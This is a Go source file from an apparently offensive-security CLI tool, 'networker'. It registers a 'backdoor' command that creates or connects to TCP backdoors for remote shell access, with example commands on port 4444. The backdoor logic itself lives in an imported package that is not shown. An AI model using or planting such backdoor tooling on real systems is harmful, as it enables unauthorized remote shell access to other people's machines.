package cmd

import (
	"fmt"

	"github.com/fuskovic/networker/pkg/backdoor"
	"github.com/spf13/cobra"
)

var (
	create, connect bool
	port            int
	address         string
	createEx        = "networker backdoor --create --port 4444"
	connectEx       = "networker backdoor --connect --address <host>:4444"
	backDoorformat  = "\ncreate:\n%s\nconnect:\n%s\n"
	backDoorEx      = fmt.Sprintf(format, createEx, connectEx)
	backDoorCmd     = &cobra.Command{
		Use:     "backdoor",
		Aliases: []string{"bd", "b"},
		Example: backDoorEx,
		Short:   "create and connect to backdoors to gain shell access over TCP",
		Run: func(cmd *cobra.Command, args []string) {
			switch {
			case create:
				backdoor.Create(port)
			case connect:
				backdoor.Connect(address)
			}
		},
	}
)

func init() {
	backDoorCmd.Flags().BoolVar(&create, "create", create, "create a TCP backdoor(must be used with --port flag)")
	backDoorCmd.Flags().BoolVar(&connect, "connect", connect, "connect to a TCP backdoor(must be used with --address flag)")
	backDoorCmd.Flags().StringVarP(&address, "address", "a", address, "address of remote target to connect to(format: <host>:<port>))")
	backDoorCmd.Flags().IntVarP(&port, "port", "p", port, "port number to listen for connections on")
	switch {
	case create:
		backDoorCmd.MarkFlagRequired("port")
	case connect:
		backDoorCmd.MarkFlagRequired("address")
	}
	Networker.AddCommand(backDoorCmd)
}
